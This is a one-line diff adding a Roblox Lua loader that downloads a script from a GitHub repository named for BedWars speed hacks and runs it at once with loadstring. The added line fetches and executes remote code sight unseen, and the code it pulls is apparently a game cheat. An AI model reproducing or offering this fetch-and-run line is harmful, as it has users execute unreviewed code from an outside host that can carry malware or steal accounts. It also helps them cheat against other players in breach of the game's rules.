@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/2DaRiver/SpeedHacks-For-RobloxBedWars/main/MainScript.lua", true))()
